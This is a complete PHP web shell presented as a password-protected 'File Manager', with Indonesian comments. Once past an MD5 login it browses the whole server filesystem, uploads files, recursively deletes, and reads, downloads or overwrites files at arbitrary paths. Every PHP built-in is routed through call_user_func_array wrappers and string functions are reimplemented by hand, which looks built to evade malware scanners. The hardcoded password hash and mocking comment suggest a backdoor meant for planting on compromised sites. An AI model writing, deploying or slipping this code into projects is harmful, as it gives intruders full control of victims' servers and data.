<?php
session_start();

/* =======================
   PASSWORD CONFIG (MD5)
   ======================= */


$PASSWORD_MD5 = '4b466d39a9982c479ab331c99ad24284'; // <-- AGUS TOTO MISKIN!!!1

/* =======================
   AUTHENTICATION
   ======================= */

if (isset($_GET['logout'])) {
	session_destroy();
	header("Location: ?");
	exit;
}

if (!isset($_SESSION['auth'])) {

	$error = '';

	if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {

		if (hash_equals($PASSWORD_MD5, md5($_POST['password']))) {
			$_SESSION['auth'] = true;
			header("Location: ?");
			exit;
		} else {
			$error = 'Invalid password';
		}
	}

	echo "<!DOCTYPE html>
	<html>
	<head>
	<title>Login</title>
	<style>
	body{
		background:#111;
		color:#eee;
		font-family:Arial;
		display:flex;
		justify-content:center;
		align-items:center;
		height:100vh;
	}
	.box{
		background:#1e1e1e;
		padding:25px;
		border-radius:10px;
	}
	input{
		padding:10px;
		margin-top:10px;
		background:#222;
		border:1px solid #444;
		color:white;
	}
	button{
		padding:10px;
		margin-top:10px;
		background:#333;
		border:none;
		color:white;
		cursor:pointer;
	}
	.err{
		color:red;
		margin-top:10px;
	}
	</style>
	</head>
	<body>
	<div class='box'>
	<h2>File Manager Login</h2>
	";

	if ($error) {
		echo "<div class='err'>$error</div>";
	}
	echo "<form method='post'>
	<input type='password' name='password' placeholder='Password'>
	<button type='submit'>Login</button>
	</form>";


	echo "</div></body></html>";
	exit;
}

/* =======================
   PURE PHP HELPERS
   ======================= */

function my_strlen($s){
	$i = 0;
	while(isset($s[$i])) $i++;
	return $i;
}

function my_substr($s,$start,$len=null){
	$out = '';
	$i = 0; $j = 0;

	while(isset($s[$i])){
		if($i >= $start){
			if($len !== null && $j >= $len) break;
			$out .= $s[$i];
			$j++;
		}
		$i++;
	}
	return $out;
}

function my_floor($x){
	$i = (int)$x;
	return ($x < $i) ? $i - 1 : $i;
}

function my_pow($base,$exp){
	$r = 1;
	for($i=0;$i<$exp;$i++) $r *= $base;
	return $r;
}

function my_explode($delim,$str){
	$res = [];
	$tmp = '';
	$dlen = my_strlen($delim);

	for($i=0; isset($str[$i]); $i++){
		$match = true;

		for($j=0;$j<$dlen;$j++){
			if(!isset($str[$i+$j]) || $str[$i+$j] !== $delim[$j]){
				$match = false;
				break;
			}
		}

		if($match){
			$res[] = $tmp;
			$tmp = '';
			$i += $dlen - 1;
		}else{
			$tmp .= $str[$i];
		}
	}

	$res[] = $tmp;
	return $res;
}

function my_trimr($s,$char){
	$len = my_strlen($s);
	while($len > 0 && $s[$len-1] === $char) $len--;
	return my_substr($s,0,$len);
}

function my_formatBytes($bytes,$precision=2){
	$units = ['B','KB','MB','GB','TB'];
	$factor = my_floor((my_strlen((string)$bytes) - 1) / 3);

	$div = my_pow(1024,$factor);
	$val = $bytes / $div;

	$p = my_pow(10,$precision);
	$val = (int)($val * $p) / $p;

	return $val . ' ' . $units[$factor];
}

/* =======================
   CUSTOM CORE WRAPPERS
   ======================= */

function _f($n, ...$a){
	return call_user_func_array($n, $a);
}

function _gp($k, $d=null){ return isset($_GET[$k]) ? $_GET[$k] : $d; }
function _pp($k, $d=null){ return isset($_POST[$k]) ? $_POST[$k] : $d; }
function _sp($k){ return isset($_SERVER[$k]) ? $_SERVER[$k] : null; }
function _real($p){ return _f('realpath', $p); }
function _cd($p){ return _f('chdir', $p); }
function _isdir($p){ return _f('is_dir', $p); }
function _isfile($p){ return _f('is_file', $p); }
function _exists($p){ return _f('file_exists', $p); }
function _islink($p){ return _f('is_link', $p); }
function _mkdir($p){ return @_f('mkdir', $p, 0755); }
function _rm($p){ return @_f('rmdir', $p); }
function _ul($p){ return @_f('unlink', $p); }
function _hdr($h){ return _f('header', $h); }
function _exit(){ exit; }
function _scan($p){ return _f('scandir', $p); }
function _mtime($p){ return _f('filemtime', $p); }
function _fsize($p){ return _f('filesize', $p); }
function _read($p){ return _f('file_get_contents', $p); }
function _write($p,$c){ return _f('file_put_contents', $p, $c); }
function _move($a,$b){ return _f('move_uploaded_file', $a, $b); }
function _base($p){ return _f('basename', $p); }
function _dir($p){ return _f('dirname', $p); }
function _url($s){ return _f('urlencode', $s); }
function _html($s){ return _f('htmlspecialchars', $s); }
function _date($f,$t){ return _f('date', $f, $t); }
function _implode($d,$a){ return _f('implode', $d, $a); }
function _arrf($a){ return _f('array_filter', $a); }
function _arrv($a){ return _f('array_values', $a); }
function _sprintf($f,...$a){ return _f('sprintf', $f, ...$a); }
function _readfile($f){ return _f('readfile', $f); }

/* =======================
   RECURSIVE DELETE
   ======================= */

/**
 * Hapus file atau folder secara rekursif.
 * Return true jika sukses, false jika gagal.
 */
function delete_path($path){
	if (!_exists($path)) {
		return true; // sudah tidak ada = anggap sukses
	}

	// Kalau file biasa atau symlink, langsung unlink
	if (_isfile($path) || _islink($path)) {
		return _ul($path);
	}

	// Kalau folder, hapus isinya dulu
	if (_isdir($path)) {
		$items = _scan($path);
		if ($items === false) return false;

		foreach ($items as $item) {
			if ($item === '.' || $item === '..') continue;

			$child = $path . '/' . $item;
			if (!delete_path($child)) {
				return false; // gagal hapus anak → batal
			}
		}

		return _rm($path);
	}

	return false;
}

/* =======================
   LOGIC
   ======================= */

$d = _real(_gp('d', __DIR__));
if (!$d) die('bad path');
_cd($d);

if (_sp('REQUEST_METHOD') == 'POST') {

	// Upload file
	if (isset($_FILES['f']))
		_move($_FILES['f']['tmp_name'], $d . '/' . _base($_FILES['f']['name']));

	// Edit file
	if (_pp('ef'))
		_write(_pp('ef'), _pp('c'));

	// Create folder / file
	if (_pp('new_name')) {
		$name = _base(_pp('new_name')); // cegah path traversal
		$type = _pp('new_type');

		if ($name !== '' && $name !== '.' && $name !== '..') {
			$target = $d . '/' . $name;

			if ($type === 'dir') {
				_mkdir($target);
			} else {
				if (!_isfile($target)) {
					_write($target, '');
				}
			}
		}

		_hdr("Location:?d=" . _url($d));
		_exit();
	}
}

if (_gp('del')) {
	$t = _base(_gp('del')); // ambil nama saja, cegah traversal
	$target = $d . '/' . $t;

	// pengaman: pastikan target masih di dalam $d
	$real_target = _real($target);
	if ($real_target !== false && my_strlen($real_target) >= my_strlen($d)
		&& my_substr($real_target, 0, my_strlen($d)) === $d) {
		delete_path($real_target);
	}

	_hdr("Location:?d=" . _url($d));
	_exit();
}

if (_gp('dl')) {
	$f = _gp('dl');
	_hdr('Content-Type: application/octet-stream');
	_hdr('Content-Disposition: attachment; filename="' . _base($f) . '"');
	_readfile($f);
	_exit();
}

if (_gp('edit')) {
	$f = _gp('edit');
	echo "<h3>" . _html($f) . "</h3><form method=post>
	<textarea name=c style='width:100%;height:300px'>" . _html(@_read($f)) . "</textarea>
	<input type=hidden name=ef value='" . _html($f) . "'>
	<button>[save]</button></form>
	<a href='?d=" . _url($d) . "'>Back</a>";
	_exit();
}

/* =======================
   UI
   ======================= */

echo "<div style='margin-bottom:10px'>
<a href='?logout=1'>[Logout]</a>
</div>";

echo "<h3>[";

if (my_substr($d,0,1) == '/') {
	echo "<a href='?d=/'>/</a>";
	$a = '/';
} else $a = '';

foreach (_arrv(_arrf(my_explode('/', $d))) as $i => $p) {
	$a = my_trimr($a, '/') . '/' . $p;
	echo ($i ? "/" : "") . "<a href='?d=" . _url($a) . "'>" . _html($p) . "</a>";
}

echo "]</h3>";

// Upload form
echo "<form method=post enctype=multipart/form-data style='margin-bottom:8px'>
<input type=file name=f><button>Upload</button></form>";

// Create form (folder / file)
echo "<form method=post style='margin-bottom:10px'>
<input type=text name=new_name placeholder='Nama folder/file' required>
<select name=new_type>
<option value='file'>File</option>
<option value='dir'>Folder</option>
</select>
<button>Create</button>
</form><hr>";

echo "<table border='1' cellpadding='5' cellspacing='0' style='width:100%;'>
<thead><tr>
<th>Name</th><th>Last Modified</th><th>Size</th><th>Actions</th>
</tr></thead><tbody>";

if ($d != '/') {
	echo "<tr><td colspan='4'>
	<a href='?d=" . _url(_dir($d)) . "'>..</a></td></tr>";
}

foreach (_scan('.') as $f) {
	if ($f == '.' || $f == '..') continue;

	$p = $d . '/' . $f;
	$t = _date('Y-m-d H:i', _mtime($p));
	$rd = _url($d);
	$x = my_formatBytes(_fsize($p));

	echo "<tr>";

	if (_isdir($p)) {
		echo "<td><a href='?d=" . _url($p) . "'>$f</a></td>
		<td><small>$t</small></td>
		<td>-</td>
		<td><a href='?d=$rd&del=" . _url($f) . "' onclick='return confirm(\"Hapus folder \\\"$f\\\" beserta SELURUH isinya?\")'>[delete]</a></td>";
	} else {
		echo "<td>" . _html($f) . "</td>
		<td><small>$t</small></td>
		<td><small>$x</small></td>
		<td>
		<a href='?d=$rd&dl=" . _url($f) . "'>Download</a> |
		<a href='?d=$rd&edit=" . _url($f) . "'>Edit</a> |
		<a href='?d=$rd&del=" . _url($f) . "' onclick='return confirm(\"Del $f?\")'>Delete</a>
		</td>";
	}

	echo "</tr>";
}

echo "</tbody></table>";
?>